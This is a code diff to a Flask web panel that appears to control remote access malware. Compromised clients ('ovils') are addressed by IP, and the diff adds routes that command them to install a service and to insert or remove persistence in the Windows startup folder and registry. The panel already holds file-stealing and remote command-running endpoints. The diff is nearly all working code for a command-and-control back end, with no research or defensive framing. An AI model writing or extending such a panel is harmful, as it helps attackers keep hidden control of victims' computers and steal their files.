@@ -506,6 +506,100 @@ def show_files(ip, page):
     return result.replace(",", "\n")
 
 
+@app.route("/ovil/<ip>/services/")
+@handle_errors
+def services(ip):
+    params = {}
+    result = start_services(ip)
+    if isinstance(result, str):
+        params["service"] = False
+        params["data"] = result
+    else:
+        params["service"], params["data"] = result
+    return render_template("servicesStartup.html", **params)
+
+
+@handle_errors
+@handle_disconnection
+def start_services(ip) -> Tuple[bool, str] | str:
+    ovil = ovils[ovils.index(ip)]
+    service = ovil.send_command("is_started", [])
+    if msg_to_bool(service):
+        return True, "Services are running!"
+    else:
+        start = ovil.send_command("install_service", [])
+        if msg_to_bool(start):
+            return True, "Services started successfully!"
+        elif semi_msg_to_bool(start):
+            return False, start
+        else:
+            return False, "Unknown error"
+
+
+@app.route("/ovil/<ip>/services/InsertStartup/")
+@handle_errors
+@handle_disconnection
+def insert_to_startup(ip):
+    ovil = ovils[ovils.index(ip)]
+    return insert_to_startup_folder(ovil) + "\n" + insert_to_startup_registry(ovil)
+
+
+@handle_errors
+@handle_disconnection
+def insert_to_startup_folder(ovil: Client):
+    startup_folder = ovil.send_command("add_to_startup_folder", [])
+    if msg_to_bool(startup_folder):
+        return "Added to startup folder successfully"
+    elif semi_msg_to_bool(startup_folder):
+        return f"Startup folder: {startup_folder}"
+    else:
+        return f"Startup folder: unknown error"
+
+
+@handle_errors
+@handle_disconnection
+def insert_to_startup_registry(ovil: Client):
+    startup_registry = ovil.send_command("add_to_registry_startup", [])
+    if msg_to_bool(startup_registry):
+        return "Added to startup registry successfully"
+    elif semi_msg_to_bool(startup_registry):
+        return f"Startup registry: {startup_registry}"
+    else:
+        return f"Startup registry: unknown error"
+
+
+@app.route("/ovil/<ip>/services/RemoveStartup/")
+@handle_errors
+@handle_disconnection
+def remove_from_startup(ip):
+    ovil = ovils[ovils.index(ip)]
+    return remove_from_startup_folder(ovil) + "\n" + remove_from_startup_registry(ovil)
+
+
+@handle_errors
+@handle_disconnection
+def remove_from_startup_folder(ovil: Client):
+    startup_folder = ovil.send_command("remove_from_startup_folder", [])
+    if msg_to_bool(startup_folder):
+        return "Removed from startup folder successfully"
+    elif semi_msg_to_bool(startup_folder):
+        return f"Startup folder: {startup_folder}"
+    else:
+        return f"Startup folder: unknown error"
+
+
+@handle_errors
+@handle_disconnection
+def remove_from_startup_registry(ovil: Client):
+    startup_registry = ovil.send_command("remove_from_startup_registry", [])
+    if msg_to_bool(startup_registry):
+        return "Removed from startup registry successfully"
+    elif semi_msg_to_bool(startup_registry):
+        return f"Startup registry: {startup_registry}"
+    else:
+        return f"Startup registry: unknown error"
+
+
 @app.route("/ovil/<ip>/steal_file/")
 @handle_errors
 def steal_files_page(ip):
@@ -660,6 +754,8 @@ def run(ip):
     if command == "run" and len(params) > 0:
         return ovil.send_command("run", params)
     return "Invalid Command! try 'help'"
+
+
 
 
 def main():
